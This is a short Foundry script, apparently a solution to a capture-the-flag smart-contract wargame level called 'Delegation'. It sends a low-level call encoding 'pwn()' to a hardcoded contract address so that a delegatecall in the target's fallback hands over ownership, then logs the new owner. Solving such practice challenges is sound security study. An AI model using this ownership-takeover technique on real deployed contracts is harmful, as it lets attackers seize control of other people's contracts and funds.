// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level6.sol";
import "forge-std/Script.sol";

contract ExploitLevel6 is Script {
    Delegation instance = Delegation(0x298e1F2cf32a2635C24699821D48c42Ad2d53456);

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        address(instance).call(abi.encodeWithSignature("pwn()"));
        console.log(instance.owner());
    }
}
